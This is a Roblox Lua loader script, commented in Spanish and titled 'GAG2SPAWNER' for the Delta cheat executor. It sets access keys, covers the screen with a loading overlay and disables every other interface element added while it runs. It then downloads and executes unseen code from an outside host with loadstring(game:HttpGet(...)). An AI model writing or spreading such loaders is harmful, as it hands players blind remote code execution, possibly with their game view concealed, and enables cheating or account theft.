-- GAG2SPAWNER: Cargador Oficial y Pantalla de Carga
-- Optimizado para Delta Executor

-- CONFIGURACIÓN GLOBAL (Llaves de acceso)
getgenv().wl = { "cer123li456tos" }
getgenv().HesizCode = "0331EEAA3C0741B4"

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- 1. Crear ScreenGui de GAG2SPAWNER (La única visible)
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "GAG2SPAWNERGui"
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 999999
screenGui.Parent = playerGui

-- Frame de fondo
local backgroundFrame = Instance.new("Frame")
backgroundFrame.Name = "BackgroundFrame"
backgroundFrame.Size = UDim2.new(1, 0, 1, 0)
backgroundFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
backgroundFrame.Parent = screenGui

-- Texto de carga
local loadingText = Instance.new("TextLabel")
loadingText.Name = "LoadingText"
loadingText.Size = UDim2.new(0.8, 0, 0.1, 0)
loadingText.Position = UDim2.new(0.1, 0, 0.4, 0)
loadingText.BackgroundTransparency = 1
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.Font = Enum.Font.SourceSansBold
loadingText.TextSize = 35
loadingText.Text = "GAG2SPAWNER: Cargando sistema..."
loadingText.TextScaled = true
loadingText.Parent = backgroundFrame

-- Barra de carga (contenedor)
local barContainer = Instance.new("Frame")
barContainer.Size = UDim2.new(0.6, 0, 0.03, 0)
barContainer.Position = UDim2.new(0.2, 0, 0.55, 0)
barContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barContainer.BorderSizePixel = 0
barContainer.Parent = backgroundFrame

-- Barra de carga (progreso)
local barProgress = Instance.new("Frame")
barProgress.Size = UDim2.new(0, 0, 1, 0)
barProgress.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barProgress.BorderSizePixel = 0
barProgress.Parent = barContainer

-- Animación infinita
local tweenService = game:GetService("TweenService")
local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
tweenService:Create(barProgress, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)}):Play()

-- 2. SISTEMA ANTI-PANTALLA DE CARGA EXTERNA
-- Bloquea cualquier otra GUI que intente aparecer mientras nosotros cargamos
playerGui.ChildAdded:Connect(function(child)
    if child:IsA("ScreenGui") and child.Name ~= "GAG2SPAWNERGui" then
        task.wait(0.05)
        -- Si la GUI parece ser de carga o es del script de Heinz, la desactivamos
        child.Enabled = false
    end
end)

-- 3. EJECUCIÓN DEL SCRIPT PRINCIPAL
-- Cargamos el contenido externo ahora que las llaves están configuradas
-- Usamos pcall para evitar que un error en el script externo rompa nuestra pantalla de carga
task.spawn(function()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://hesiz.com/api/iepONhug/raw"))()
    end)
    
    if not success then
        loadingText.Text = "Error al conectar con el servidor."
        loadingText.TextColor3 = Color3.fromRGB(255, 50, 50)
    end
end)

print("GAG2SPAWNER: Sistema iniciado con éxito.")
